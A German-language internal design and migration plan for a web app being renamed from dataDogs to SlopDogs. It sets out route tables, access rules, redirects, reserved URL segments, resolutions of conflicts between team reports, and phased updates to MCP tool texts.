| GET | `/index.html`, `/main-*.js`, `/chunk-*.js`, `/polyfills-*.js`, `/styles-*.css`, `/favicon.ico`, `/favicon.svg`, `/assets/**` | `express.static(angularBrowserDir)` :10 (Schritt 8, vor allen Routen) | anon | Dateien | gleich | unveraendert; Favicon wird SVG-Napf (P5), `favicon.ico` bleibt als Rueckfall |

#### Werkstatt — `/api`

| Methode | Pfad | Bediener | Auth | Antwort | Alter Pfad | Uebergang |
|---|---|---|---|---|---|---|
| GET | `/api/kennels` | `ConfigRouteHandler.ts:123` -> `handleList` :167-197; `ListQuery` (q, sort, dir, limit, offset, mine); NEU sort `calls|calls30d|rating`, `minStars`, `minCalls`; `stats` angehaengt | anon (ACL) | JSON Envelope | gleich | erweitert (P4) |
| GET | `/api/kennels/:id` | :128 -> `handleGetById` :203-229; NEU `stats` (nur subpath kennels) | canRead (404) | `{ok,data}` | gleich | erweitert (P4) |
| GET | `/api/kennels/:id/versions` | :118 -> `handleGetVersions` :509-540; canRead seit 2026-09-13 vorhanden (:520-531) | canRead (404) | JSON | gleich | unveraendert; Regressionstest in P1 |
| POST | `/api/kennels` | :133 -> `handleCreate`; Segment-Regel statt Blockliste in `api/KennelController.ts:75-80` | login (401), Dog-Referenzen canRead | JSON | gleich | P3 |
| PUT | `/api/kennels/:id` | :144 -> `handleUpdate` | canMutate | JSON, neue Version | gleich | unveraendert |
| PATCH | `/api/kennels/:id/rename` | :149 -> `handleRename` :464-501 | canMutate | JSON | gleich | unveraendert; Segment-Regel gilt nicht fuer `displayName` |
| DELETE | `/api/kennels/:id` | :154 -> `handleDelete`; `KennelController.delete` :419-443 loescht kuenftig auch Stats und Ratings | canMutate | JSON | gleich | P4 |
| GET | `/api/kennels/:id/export` | `api/routes/KennelBundleHandler.ts:39` | canRead | JSON Bundle | gleich | unveraendert |
| POST | `/api/kennels/import` | :40 -> `handleImport` (login :143; Segment-Regel :204-209) | login | `{ok,kennelId,idMap}` | gleich | P3 (Regel) |
| GET/POST | `/api/kennels/:id/run` | `KennelRunHandler.ts:63-64` -> `handleRun` :465-500 | canRead | `{ok,waves,kennelConfig}` | gleich | unveraendert; Heavy-Gate (`heavyRequestLimiter.ts:54`) |
| GET/POST | `/api/kennels/:id/execute` | :65-66 -> `handleExecute` :502-537 | canRead | Lead-Yield content-type-ehrlich | gleich | bleibt vorerst (Lotus) |
| GET | `/api/kennels/:id/rating` | NEU `api/routes/KennelRatingHandler.ts` | canRead (404) | `{ok,lineageId,avg,count,score,histogram,mine}` | — | P4 |
| PUT | `/api/kennels/:id/rating` `{stars}` | NEU | login (401), canRead (404), nicht Owner/Editor (403), stars 1..5 (400) | Aggregat | — | P4 |
| DELETE | `/api/kennels/:id/rating` | NEU | login | Aggregat | — | P4 |
| GET | `/api/kennels/:id/docs` | NEU 308 -> `/k/:id/docs` (+`?version`) | — | 308 | — | dauerhaft billig, darf bleiben |
| GET | `/api/kennels/:id/swagger.json` | NEU 308 -> `/k/:id/openapi.json` (+`?version`) | — | 308 | — | dauerhaft |
| GET | `/api/nodes` (+`?kennelId=`) | `api/routes/NodesRouteHandler.ts:48` | anon, `filterReadable` :70 | JSON Envelope | gleich | unveraendert |
| GET/POST/PUT/PATCH/DELETE | `/api/nodes[/:id[/versions\|/rename]]` | `ConfigRouteHandler.ts:118-154` (subpath nodes) | wie kennels | JSON | gleich | unveraendert |
| POST | `/save` | `ConfigRouteHandler.ts:139` (Legacy; einziger Rufer `ui-app/src/app/services/dog.service.ts:71`) | canMutate | JSON | gleich | unveraendert, bleibt festes Segment bis BACKLOG.md:83 |
| GET | `/api/readme` | `api/routes/ReadmeRouteHandler.ts:21` | anon | `text/markdown` | gleich | Inhalt umbenannt (P2) |
| WS | `/api/channels?channelId=` | `ChannelHub.attach(httpServer)` `main.ts:209-210`; Upgrade nur bei `url.pathname === path` (`services/ChannelHub.ts:118-122`), Default :54, Env `WS_PATH` | anon | WebSocket-JSON (`mcp/skill.md:843-852`) | gleich | unveraendert |

#### Maschinenzugang, Auth, Meta (nur Namen aendern sich)

| Methode | Pfad | Bediener | Auth | Antwort | Uebergang |
|---|---|---|---|---|---|
| POST | `/mcp` | `mcp/transports/mcp.ts:187`; `serverInfo.name` `slopdogs` (:81); Resource `slopdogs://skill` plus Alias `datadogs://skill` (:64, :116-142) | login (401, Realm "SlopDogs MCP" :197); Rate-Limit :171 | JSON-RPC | P2 |
| GET | `/mcp` | :227 | — | 405 | unveraendert |
| GET | `/actions/openapi.json` | `mcp/transports/openapi.ts:70` (title "SlopDogs Actions" :75) | anon | JSON | P2 |
| GET | `/actions/gpt-template` | :144 (name :148) | anon | JSON | P2 |
| POST | `/actions/:tool` | :181; kein Rate-Limit (Amar) | login | `{result}` / `{error}` | unveraendert |
| GET/POST | `/auth/authorize`, `/auth/token`, `/auth/revoke`, `/auth/register` | `mcp/auth/oauth-as.ts:55-193` via `router.ts:21` | OAuth 2.1/PKCE | Redirect/JSON | unveraendert |
| GET/POST | `/auth/tokens`, `/auth/tokens/:jti/revoke` | `mcp/auth/personal-tokens.ts:31-71` (Titel :166) | Session | HTML | P2 (Titel) |
| GET | `/auth/google/login?returnTo=`, `/auth/google/callback` | `router.ts:34,59`; `returnTo` nur same-origin-Pfade (:27-33); Redirect-URI aus `GOOGLE_OAUTH_REDIRECT_BASE` (`mcp/auth/google.ts:13,44`) | — | Redirect | Host-Umzug: neue Callback-URI in der Google-Konsole (P7) |
| GET/POST | `/auth/me`, `/auth/logout` | `router.ts:103,123`; logout loescht `slopdogs.sid` und uebergangsweise `datadogs.sid` | Session | JSON | P2 |
| GET | `/.well-known/oauth-authorization-server`, `/.well-known/oauth-protected-resource` | `mcp/auth/discovery.ts:17,35`; issuer = `MCP_BASE_URL` (:6-11) | anon | JSON | Host-Umzug: issuer wechselt (P7) |
| GET | `/static/*` | `createHttpApplication.ts:173-176` -> `public/` | anon | Dateien | Landing-Assets liegen unter `/static/landing/…` |

#### Alt-Weiche (uebergangsweise, hinter Env `LEGACY_KENNEL_REDIRECT`, Default `1`)

| Methode | Pfad | Bediener | Antwort | Bemerkung |
|---|---|---|---|---|
| ALL | `/:name` | NEU in `KennelRunHandler.registerRoutes` **nach** `/k/:kennelId`: `FIXED_TOP_LEVEL.has(name.toLowerCase())` -> `next()`; sonst `res.redirect(308, '/k/' + name + originalQuery)`; **kein DB-Lookup** | 308 | Boreal-Sonde (`scratchpad/route_probe.cjs`, Express 5.2.1): Query, Methode, %-Kodierung bleiben; `/assets/` und `/favicon.png` erreichen die Weiche nur, wenn `express.static` sie nicht bedient |
| — | SPA-Fallback | `httpFrontEnd.builtUi.ts:15-22`; `SPA_FALLBACK_SKIP_PREFIXES` (`spaRouteConstants.ts:10`) += `/k` | — | ein unbekannter `/k/<x>` endet als 404 JSON, nicht als `index.html` |

### 2.3 ASCII-Baum des Zielbilds

```
https://<neu>/
├── /                                   GET|HEAD  statisch  public/landing/index.html   (DB-frei, OpenGraph)
├── /robots.txt                         GET       statisch  public/landing/robots.txt
├── /api/landing?limit=                 GET       Landing-Daten, 60-s-Memo, nur public       [NEU P4]
├── /k/                                 ── WARE: oeffentlich, teilbar, content-type-ehrlich ──
│   └── :id                             GET|POST  Lead-Yield   ?query ?version ?format=json|data=1 ?channelId   [Public-Bremse]
│       │                               HEAD      200/404 ohne Lauf, ohne Zaehlung
│       ├── docs                        GET       Swagger-UI                             (war /api/kennels/:id/docs -> 308)
│       └── openapi.json                GET       OpenAPI 3.0.3, paths['/k/:id']         (war /api/kennels/:id/swagger.json -> 308) [Public-Bremse]
├── /kennels                            ── BUEHNE: Angular-SPA (index.html via Fallback) ──
│   ├── ?q=  ?new=1                     Liste mit vorbelegter Suche / geoeffnetem Formular
│   ├── :id  [?panel=rating]            Waves-Viewer (+ Inspector-Tab Bewertung)         (war /kennel/:id -> Angular-redirectTo)
│   └── :id/edit                        Editor                                           (war /kennel/:id/edit)
├── /kennel[/:id[/edit]]                Angular-Weiche -> /kennels/…                     [uebergangsweise]
├── /api/                               ── WERKSTATT ──
│   ├── kennels                         GET(list: q sort dir limit offset mine + calls calls30d rating minStars minCalls; stats) POST
│   │   ├── import                      POST (login)
│   │   └── :id                         GET(+stats) PUT DELETE(+Stats/Ratings)
│   │       ├── versions                GET   (canRead vorhanden)
│   │       ├── rename                  PATCH
│   │       ├── export                  GET
│   │       ├── run                     GET|POST  volle Waves, redigiert                 [Heavy-Gate]
│   │       ├── execute                 GET|POST  Lead-Yield                              [Heavy-Gate]
│   │       ├── rating                  GET PUT DELETE                                    [NEU P4]
│   │       ├── docs                    GET -> 308 /k/:id/docs
│   │       └── swagger.json            GET -> 308 /k/:id/openapi.json
│   ├── nodes[/:id[/versions|/rename]]  wie kennels (subpath)
│   ├── readme                          GET   text/markdown
│   └── channels?channelId=             WS    Upgrade am http.Server (ChannelHub)
├── /save                               POST  Legacy (BACKLOG.md:83)
├── /mcp                                POST  JSON-RPC (serverInfo slopdogs; Resource slopdogs://skill + Alias datadogs://skill)
├── /actions/{openapi.json,gpt-template,:tool}
├── /auth/{authorize,token,revoke,register,tokens[/:jti/revoke],google/login,google/callback,me,logout}
├── /.well-known/{oauth-authorization-server,oauth-protected-resource}   issuer = MCP_BASE_URL
├── /static/*                           public/  (swagrid.png, landing/*.woff2, landing/robots.txt)
├── /index.html /main-*.js /chunk-*.js /polyfills-*.js /styles-*.css /favicon.svg /favicon.ico /assets/**   Angular-Build (static, vor allen Routen)
└── /:name                              ALL -> 308 /k/:name?…   (feste Segmente -> next; kein DB-Lookup; Env-Flag; faellt mit DB-Reset)
```

### 2.4 Link-Beispiele vorher -> nachher (`<neu>` = neuer Render-Host aus P7)

| Was | Vorher | Nachher |
|---|---|---|
| Public-Seite | `https://datadogs-9qde.onrender.com/wetter?lat=51.7&lng=8.7` | `https://<neu>/k/wetter?lat=51.7&lng=8.7` |
| Lobby-Einladung | `…/spiel?channelId=abc` | `https://<neu>/k/spiel?channelId=abc` (entsteht im Browser aus `location.pathname`, kein Dog aendert sich) |
| Swagger-UI | `…/api/kennels/wetter/docs` | `https://<neu>/k/wetter/docs` |
| OpenAPI | `…/api/kennels/wetter/swagger.json?version=…` | `https://<neu>/k/wetter/openapi.json?version=…` |
| Teilen-Knopf (Liste) | `…/kennel/wetter` (Viewer, `kennel-list.component.ts:466`) | `https://<neu>/k/wetter?<defaultQuery>` (Public-Seite) |
| Viewer ("Studio-Link") | `…/kennel/wetter` | `https://<neu>/kennels/wetter` |
| Editor | `…/kennel/wetter/edit` | `https://<neu>/kennels/wetter/edit` |
| Liste | `https://datadogs-9qde.onrender.com/` | `https://<neu>/kennels` — `/` ist die Landing |
| MCP | `…/mcp` (Schluessel `datadogs-int`) | `https://<neu>/mcp` (Schluessel `slopdogs-int`) |
| build_kennel-Antwort | `publicUrl: "/wetter"`, `runUrl: "/api/kennels/wetter/run"` (`mcp/tools/kennels.ts:1121-1122`) | `publicUrl: "/k/wetter"`, `docsUrl: "/k/wetter/docs"`, `openapiUrl: "/k/wetter/openapi.json"`, `runUrl` unveraendert |
| Alt-Link nach Umzug | `https://datadogs-9qde.onrender.com/wetter` | 308 -> `https://<neu>/wetter` (Weiterleiter, Entscheidung 8.1) -> 308 -> `https://<neu>/k/wetter` (Alt-Weiche): zwei Hops, korrekt |

### 2.5 Reservierte Segmente

`FIXED_TOP_LEVEL` (neu in `api/routes/spaRouteConstants.ts`, ersetzt `KENNEL_LINEAGE_ID_BLOCKLIST` und `RESERVED_TOP_LEVEL_SEGMENTS`):

```
api  auth  .well-known  static  mcp  actions  save  k  kennels  kennel  robots.txt
```

- `api auth .well-known static mcp actions` = Express-Mounts (`createHttpApplication.ts:165-176, 206-291`).
- `save` = Legacy-POST (`ConfigRouteHandler.ts:139`).
- `k` = Ware; `kennels` = Buehne; `kennel` = Angular-Weiche fuer Alt-Links (faellt mit der Weiche).
- `robots.txt` = Landing-Datei.
- Angular-Artefakte (`index.html`, `main-*.js`, `favicon.*`, `assets/**`) brauchen keinen Eintrag: `express.static` liegt vor allen Routen (Schritt 8).
- Reservierte **zweite** Segmente unter `/k/:id/`: `docs`, `openapi.json`. Sie beschraenken keinen Kennel-Namen — der Name ist Segment 2, die Reservierung Segment 3. Ein Kennel `docs` lebt unter `/k/docs`, seine Doku unter `/k/docs/docs`.
- Die Liste dient nur der Alt-Weiche (`next()` statt 308). Kennel-Namen werden **nicht** mehr gegen sie geprueft — ein Kennel darf `api` heissen und lebt unter `/k/api`.

### 2.6 Namensregel fuer Kennel-IDs (lineageId)

```
KENNEL_ID_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/
```

- Ein Segment, nicht leer, 1..64 Zeichen, URL-sicher ohne Kodierung; kein `/`, kein Leerzeichen, kein `?`, `#`, `%`.
- Zusaetzlich verboten: `.` und `..` (Pfadsemantik) — die Regel laesst sie formal zu, `kennelIdBlockedReason` lehnt sie ausdruecklich ab.
- Eindeutigkeit case-insensitiv: `create` prueft `findByLineage` mit der Original-Schreibweise **und** lehnt ab, wenn eine Lineage existiert, die sich nur in der Schreibweise unterscheidet (Lookup ueber `findLatestByType` einmal, Vergleich `toLowerCase()`; Kosten: ein Partition-Scan je create — create ist selten). Der Lookup selbst bleibt case-sensitiv (`resolveKennel` `KennelController.ts:486-513`), damit bestehende Links weiter treffen.
- Gilt fuer: `POST /api/kennels` (id), `POST /api/kennels/import` (`KennelBundleHandler.ts:204-209`), MCP `create_kennel`/`build_kennel` (laufen ueber `kennelsController.create`), UI `kennel-form.component.ts:153-159`. Gilt **nicht** fuer `displayName`/`name` (frei) — `kennelDisplayNameBlockedReason` entfaellt ersatzlos.
- Heute gibt es keine Regel (gezaehlt: 0 Treffer `pattern|regex|slug` in `KennelController.ts`, `kennel-form.component.ts`, `mcp/tools/kennels.ts`). Eine ID mit `/` waere speicherbar und unerreichbar (gefolgert).
- Eine Quelle: `packages/core/src/kennelPaths.ts` (Umwidmung von `kennelReservedNames.ts`) exportiert `KENNEL_PUBLIC_PREFIX = '/k'`, `publicKennelPath(id)`, `KENNEL_ID_PATTERN`, `kennelIdBlockedReason(id)`. UI-Handkopie `ui-app/src/app/config/public-paths.ts` (Vite kann keine Core-Subpfade laden — dieselbe Begruendung wie heute `kennel-reserved-names.ts:2`), mit Kommentar "muss mit packages/core/src/kennelPaths.ts uebereinstimmen".

---

## 3. Widersprueche zwischen den Berichten und ihre Aufloesung

| # | Thema | Bericht A | Bericht B | Aufloesung | Begruendung |
|---|---|---|---|---|---|
| W1 | Platz des Sterne-Widgets | Amar Umsetzung 8.3: interaktive Sterne "im Kopf des Waves-Viewers neben dem Titel (:7/:106)" | Follie Vorlage (verworfen): Tab "Bewertung" im bestehenden Inspector | **Verhalten nach Amar (8.3, Zustandsmaschine) ist festgeschrieben; der Ort und die Optik folgen mit Follies neuer Vorlage.** Der Bau haelt beide Orte offen: `kennel-rating` ist eine Standalone-Komponente ohne Layout-Annahme; der Viewer kann sie im Kopf oder als Inspector-Tab `rating` (Typ `KennelTab` `waves-viewer.component.ts:27`, Tab-Leiste :178-185) einhaengen. `?panel=rating` oeffnet das Widget, wo immer es liegt. | Amar hat die Optik an Follie abgegeben (Ueberschrift 8: "Optik bei Follie"); Follies Vorlage ist verworfen, die neue steht aus. Kein Bericht wird bevorzugt — beide Orte sind vorbereitet, die Entscheidung faellt mit der Vorlage (Abschnitt 8.6). |
| W2 | Vertrag `GET /api/landing` | Follie 3.1: `{ok, asOf, top:{views:[Card], stars:[Card]}}`, Card mit `url` inkl. defaultQuery, `views`, `stars:{avg,count}\|null`, Sterne-Liste nur `count >= 3`, Beschreibung serverseitig auf 140 Zeichen | Amar 6.4: `{ok, generatedAt, windowDays, topByCalls30d:[…], topByRating:[…]}`, Eintrag mit `publicPath` ohne defaultQuery und vollem `stats`; Sterne-Liste nach Bayes-Score, `count === 0` entfaellt. Boreal 1.1: `{top, rated, count}` mit `url` inkl. defaultQuery | **Ein Vertrag (P4 4.7):** Amars Form und Sortierung (10-0 hat Bayes statt Mindestanzahl angenommen — Empfehlung 4), aber Follies `url` **mit** defaultQuery und die 140-Zeichen-Kuerzung. Feldname `url`. | Bayes ist entschieden; "count >= 3" wuerde die Liste monatelang leer lassen (Amar A). `url` mit defaultQuery: die Landing soll das Praefix nicht kennen (Follie), und die Liste baut ihre Links heute genauso (`kennel-list.component.ts:420-433`); der Server mischt defaultQuery zwar ohnehin (`mergeQueryParams`), aber ein Link, der seine Parameter zeigt, ist teilbar und editierbar ("Parameter in der URL", `mcp/skill.md:774`). |
| W3 | Welche Aufrufzahl der Mensch sieht | Follie Entscheidung 5: "Rangliste nach 30 Tagen, angezeigte Zahl gesamt" | Amar 8.2: Badge compact zeigt `ranked30d`; Liste sortiert nach `calls30d` | **Ueberall dieselbe Zahl: `calls.ranked30d`** (Landing "Meist aufgerufen", Badge, Sortierung "Aufrufe (30 T)"); Gesamt im Tooltip/aria-label und in der API. | Eine Liste, die nach 30 Tagen sortiert und Gesamtzahlen zeigt, ist nicht monoton und liest sich als Fehler — gegen Follies eigenes Gebot "ehrlich". 30 Tage haelt die Liste lebendig (Follie 5). |
| W4 | Public-Bremse | Boreal P1: `MAX_CONCURRENT_PUBLIC_RUNS`, Default 4, in P1, Regex heute `^\/[^/]+\/?$`, spaeter `^\/k\/…` | Amar 5: `MAX_CONCURRENT_PUBLIC_REQUESTS` Default 6, Commit 8 in P4 | **Lotus hat entschieden:** Boreals Name und Default, in P1. Amars Commit 8 entfaellt; P3 stellt nur die Regex um. Boreals P1-Regex wird verfeinert (4.1), weil `^\/[^/]+\/?$` auch `/index.html`, `/main-*.js` und `/kennels` bremsen wuerde — die Bremse liegt bei Schritt 6, vor `express.static` (Schritt 8). | Montage-Reihenfolge `createHttpApplication.ts:171` vs :178. |
| W5 | `/api/kennels/:id/versions` ohne canRead | Boreal Zielbild 1.4 und P1: "ohne canRead, nachziehen" (Amar hunt_0913) | Repo 4b10138: `ConfigRouteHandler.ts:520-531` gated seit 2026-09-13 mit canRead, 404 | **Kein Fix noetig.** P1 ergaenzt nur den Regressionstest `testVersionsRespectCanRead`. | Verifiziert im Code; Boreals Aussage stammt aus dem Amar-Archiv vor dem Fix. |
| W6 | Bildmotiv `bg1` | Follie/Boreal: `bg1.avif` 162.297 B, WebP 325.966 B (gemessen auf f306a17) | `feature/slopdogs` @ 4b10138 traegt nur `ui-app/src/assets/bg1.png` (3.468.582 B, gemessen); AVIF/WebP kamen mit f306a17 auf `fix/prisma-connection-pool` (`git show --stat f306a17`) | **Nur relevant, falls die neue Vorlage das Motiv nutzt.** Dann: vor P5 `fix/prisma-connection-pool` (78ba628 + f306a17) in `feature/slopdogs` mergen (Freigabe 10-0, Abschnitt 8.5); das PNG darf nie auf die Landing. | Ein 3,4-MB-PNG widerspricht dem Gewichtsbudget (P5 5.6). |
| W7 | Rang-Segment fuer Landing-Sterne | Follie 3.1: nur `count >= 3` | Amar/10-0: Bayes C=5, `count >= 1` | **Bayes, `count >= 1`.** | Entschieden (Amar-Empfehlung 4 angenommen). |
| W8 | Owner-Zustand im Rating-Widget | Follie Vorlage (verworfen) Zustand 4: Owner sieht Sterne-Verteilung | Amar 4: Aggregat nur `count`/`sum`, keine Verteilung | **Datenseitig vorbereitet:** `GET /api/kennels/:id/rating` liefert `histogram` (eine `GROUP BY stars`-Abfrage je Aufruf, nicht in Listen). Ob die Owner-Ansicht es zeigt, entscheidet die neue Vorlage. | Kosten: ein PK-Range-Scan auf `KennelRating` je Widget-Oeffnung; Listen und Memo bleiben unberuehrt. Ein Feld mehr im Vertrag ist billiger als ein zweiter Umbau. |
| W9 | `datadogs.kennelList.sort.v3` vs `slopdogs.…` | Amar 8.4: `slopdogs.kennelList.sort.v3` | Boreal 2.3: dito | kein Widerspruch — `slopdogs.kennelList.sort.v3` | — |
| W10 | Tiefe der Umbenennung | Follie 2.3 und Lotus-Kurzplan: nur sichtbar + Protokoll, `@datadogs/*` bleibt | 10-0 ~11:00: komplett | **10-0.** T2 wandert nach vorn (P2), sonst kollidiert jeder Feature-Commit mit dem Scope-Rename (Boreal F, T2). | Entschieden. |
| W11 | Render-Host | Boreal Runde 1 / Lotus: Host behalten (PATs, TRUSTED_HOSTS) | 10-0: neuer Host, alter wird abgeschaltet (8.1 entschieden) | **10-0.** Runbook P7 ohne Weiterleiter. | Entschieden. |
| W12 | Landing in der SPA oder statisch | Follie 8 ("Die Landing lebt in der SPA", vier Komponenten, Budget 20/24 kB) | Boreal G (Variante B statisch), Lotus-Kurzplan (statisch), Follie Runde 2 (statische Datei unter `/`) | **Statisch** (`public/landing/index.html`). Das gilt unabhaengig von der Optik — auch fuer die neue Vorlage. | Sofortiger Paint ohne 386 KB JS (gemessen, Boreal G), OpenGraph, kein Komponenten-Budget. |
| W13 | Aufloesung von `kennel-import-target.ts` | Boreal nennt `ui-app/src/app/config/kennel-import-target.ts` als zweite Handkopie | Datei existiert auf 4b10138 nicht (`sed: No such file`); Boreal Runde 3: `utils/kennel-import-target.ts` (89 Z.) ist die Handkopie | Nur `kennel-reserved-names.ts` wird geloescht; `utils/kennel-import-target.ts` bleibt als bewusste Kopie. | Verifiziert. |
| W14 | Name und Ort der Rechte-Phase | Follie 7.4: "P4d" | Nira 6: "P3.5 ACL v2, vor P4" | **P3.5 vor P4** (Lotus). | Stats, Ratings und Keys haengen an `canRead`; erst mit RUN getrennt von READ koennen Ratings an RUN haengen und der Key-Store die Regel "keine Keys unterhalb READ" formulieren (Nira 6). |
| W15 | Ort und Name des UI-Overhauls | Follie 6.1: "P7 UI nach P4" | Lotus: P6 UI-Overhaul nach P5, Host-Umzug wird P7 | **P6 = UI, P7 = Umzug** (Lotus). | Der Umzug ist zuletzt (8.3); das UI muss vor dem Umzug stehen, sonst wird zweimal deployt. |
| W16 | COPY als eigenes Recht | Follie 4.6/7.4: Schalter "readers may copy (export, fork)" je Kennel; Rechte-Chips run/read/copy/edit | Nira 2: COPY = READ — wer Code sieht, kann ihn kopieren; der Bildschirm ist nicht sperrbar | **COPY = READ, kein Schalter** (Nira). Rechte-Chips in der UI: `run · read · edit`. | Ein Schalter, der nur den Export-Knopf versteckt, aber den Code im Inspector laesst, ist ein Versprechen ohne Deckung. Der einzige wirksame Kopierschutz ist `run-only`. |
| W17 | Was ein RUN-only-Leser vom Kennel sieht | Nira W1/T2: `/run` liefert Waves mit `result`, ohne codeTs/vmContext/typedef — Identitaet je Dog bleibt | Follie 4.2/7.6: Run-only-Kennel zeigt Silhouetten ohne Namen; `[Run]` zeigt nur Status und Dauer, nie Waves; "Server muss Namen aus der Redaktion nehmen" | **Zwei Stufen im Redaction-Modus** (P3.5 3.5.4): (1) Kennel-Stufe RUN -> `/run` liefert nur Struktur (`waves: [{dogCount}]`, `leadResult`, `durationMs`, `status` je Dog ohne id/name/result); (2) Dog-Stufe RUN in einem Kennel mit READ -> Niras W1 (Identitaet + result + error, kein Code). | Follie 7.6: Dog-Namen wie `StripeWebhookSigner` verraten Architektur; Nira W2: RUN am Kennel bedeutet ohnehin "nur Lead-Result". Beide Aussagen gelten auf ihrer Stufe. |
| W18 | Rollenname fuer READ-Personen | Follie: `reader` | Nira/Schema: `viewers[]` | Schema-Spalte bleibt `viewers` (bestehend, `schema.prisma:36`); UI-Label und MCP-Rolle heissen `reader` (`grant_access … role:'reader'` als Alias von `viewer`). | Kein Schema-Umbau fuer ein Wort; ein Alias im Werkzeug kostet eine Zeile. |
| W19 | Void-Kino (YouTube-Embed bei Fehler/Laden) | Boreal A.4 #3: streichen (8 Ausloeser, Fremd-iframe, mobile-first) | Follie 5/7.12: behalten, nur aus `sd-banner` ausgeloest | Entscheidung 8.18 (Empfehlung: Follie — behalten, ein Ausloeser, Iris-Easter-Egg im Lade-Indikator faellt). | Beide Berichte einig, dass 8 Ausloeser zu viel sind; der Rest ist Geschmack des 10-0. |
| W20 | Key-Store-Verwaltung: Server-HTML oder App | Nira 3.4 / P4c 4c.3: `/auth/keys` Server-HTML nach PAT-Muster; Boreal A.3: Entscheidung noetig; Follie 7.9: App unter `/account`, Server-Seiten als Rueckfall ohne Link | **App unter `/account`, kein Server-HTML fuer Keys** (Lotus). `/auth/tokens` bleibt, bis U7 die Tokens in die App holt. | Zwei Optiken fuer dieselbe Marke sind der Bruch, den der 10-0 "nicht professionell" nennt (Follie). |
| W21 | Rating-Berechtigung | P4 4.4.1 Regel 2: `canRead` | Follie 4.2: "Run-only-Nutzer duerfen bewerten; sie kennen das Ergebnis"; Nira 6: Ratings an RUN haengen | **`canRun`** ab P3.5 (P4 baut zuerst auf `canRead`, P3.5 Commit 3 stellt um — P3.5 liegt vor P4, also wird P4 direkt mit `canRun` gebaut). | Bewertet wird, was man benutzt hat; benutzen = RUN. |
| W22 | Lobby-Auth (Nira F6) | Nira 7.7: "P5" (gemeint: die Landing-Phase der damaligen Zaehlung) | P5 ist jetzt der Landing-Kennel | Nicht Teil von A030; Backlog-Eintrag mit Hinweis `ChannelHub.newChannelId :74` (Entropie ungeprueft). | Datenleck, kein Code-Leck; ausserhalb des Rechtemodells (Nira W19). |

---

## 4. Phasen

### 4.0 Pflichtpunkt in jeder Phase: MCP-Texte nachziehen (Boreal Runde 3, Stellenliste)

Agenten lesen sieben Kanaele (Boreal B): (1) `initialize.instructions` = Werkzeugkasten (`mcp/werkzeugkasten.ts`, aus Code erzeugt: VM-Globals + `static mcpGuidance`, heute nur `WebSocketChannelRetriever.ts:41`) + Spuren-Kurzbrief (`mcp/spuren-brief.ts:7-27`) + Resource-Verweis (:35); `serverInfo` `mcp.ts:81`. (2) `tools/list` mit gekuerzten Beschreibungen (`mcp.ts:38-43, 88-94`), `describe_tool` liefert die Langform (`meta.ts:60-85`). (3) Resource `datadogs://skill` = `mcp/skill.md` (`mcp.ts:64, 116-142`; Anzeigename :120). (4) `get_readme` = README.md (`meta.ts:28-45`), auch `GET /api/readme`. (5) `/actions/openapi.json` + `/gpt-template` (`openapi.ts:70-178`). (6) Antwortfelder mit Pfaden: nur `build_kennel` (`kennels.ts:1121-1122`). (7) Repo-Doku fuer Agenten ausserhalb: `AISkill.md`, `.cursor/skills/datadogs-mcp-gateway/SKILL.md` (Spiegel von skill.md, :245 sagt es selbst).

Regel: Pfade in Tool-Texten werden aus der Pfad-Konstante gebaut (`publicKennelPath('<id>')`, `publicKennelDocsPath`, `publicKennelOpenApiPath` als Template-Strings in `kennels.ts`/`snapshots.ts`), damit Code und Text dieselbe Quelle lesen; Markdown-Dateien werden per Doc-Lint (P3 Commit 8) gegen die Routentabelle geprueft. Jede Phase schliesst mit dem Commit `docs(mcp): Texte fuer <Phase>` ab, der genau die Zeilen dieser Phase aus der folgenden Liste aendert:

| Stelle | steht dort | Phase | neuer Wortlaut-Kern |
|---|---|---|---|
| `mcp/transports/mcp.ts:81` | `serverInfo {name:'datadogs', version:'0.2.0-beta.0'}` | P2 | `slopdogs`; Version aus `package.json` lesen statt Literal |
| `mcp.ts:64,116-142` | Resource `datadogs://skill`, Name "Skill: dataDogs MCP usage guide" | P2 | `slopdogs://skill` + Alias-Eintrag alt (deprecated), Name "Skill: SlopDogs MCP usage guide" |
| `mcp.ts:197` | Realm "dataDogs MCP" | P2 | "SlopDogs MCP" |
| `mcp/spuren-brief.ts:35` | "… Resource `datadogs://skill`" | P2 | `slopdogs://skill` |
| `spuren-brief.ts:22` | "`GET /api/kennels/:id/export`" | — | unveraendert (Pfad bleibt) |
| `mcp/werkzeugkasten.ts:5` | Kommentar `datadogs://skill` | P2 | slopdogs |
| `werkzeugkasten.ts:48-52` | "Alles Weitere: `list_nodes` fragen …" | P4b | += "Sortiere mit `sort:'proven'` — bewaehrte Dogs zuerst; baue keinen Dog neu, den `list_nodes {search}` schon bewaehrt liefert" |
| `werkzeugkasten.ts:23-27` (VM-Globals aus Registry) | jsonStore-Doc aus `main.ts:120-122` | P4c | Capability `keys` kuendigt sich selbst an (Doc-String bei `registerVmGlobalCapability('keys', …)`): "keys.fetch(url, opts) — ersetzt `{{key:<alias>}}` serverseitig, nur erlaubte Domains; keys.list() nur Aliase; kein keys.get" |
| `WebSocketChannelRetriever.ts:41-48` (mcpGuidance) | Teilen-Link aus `location` | — | unveraendert (pfadneutral) |
| `mcp/tools/kennels.ts:1121-1122` | `publicUrl: '/${kennelId}'`, `runUrl` | P3 | `publicUrl: publicKennelPath(id)`, `docsUrl`, `openapiUrl`; runUrl bleibt |
| `kennels.ts:429-430` (build_kennel) | Langtext ohne Pfad | P3 | += "The public address is `/k/<kennelId>` (returned as publicUrl); docs at `/k/<kennelId>/docs`." |
| `kennels.ts:259-261` (list_kennels) | Metadaten-Text; Schema `{}` | P4 | Schema search/mine/sort/dir/minStars/minCalls/limit/offset; Text += "each entry carries `stats` {calls, rating}; WITHOUT limit a bare array, WITH limit an envelope" |
| `kennels.ts:271-272` (get_kennel) | Header-Felder | P3.5, P4 | += "`myRights: {run, read, edit, own}`" (P3.5); += "`stats` (calls.ranked30d, rating.avg/count/score)" (P4) |
| `kennels.ts:384-385` (create_kennel), `:524-525` (update_kennel) | "Only the owner (or super-user) can update" | P3.5 | "owner or a user with `edit` right"; visibility-Satz: `public \| run-only \| private`; "dogIds may reference dogs you can run; run-only foreign dogs are pinned to a version" |
| `kennels.ts:608-609` (run_kennel), `:655-656` (execute_kennel) | "DATADOGS_VM_TIMEOUT_MS"; execute = "the public-facing payload" | P2, P3 | `SLOPDOGS_VM_TIMEOUT_MS`; execute += "identical to `GET /k/<id>`" |
| `kennels.ts:443,625,671`; `snapshots.ts:199` | "Overrides DATADOGS_VM_TIMEOUT_MS" | P2 | SLOPDOGS_ |
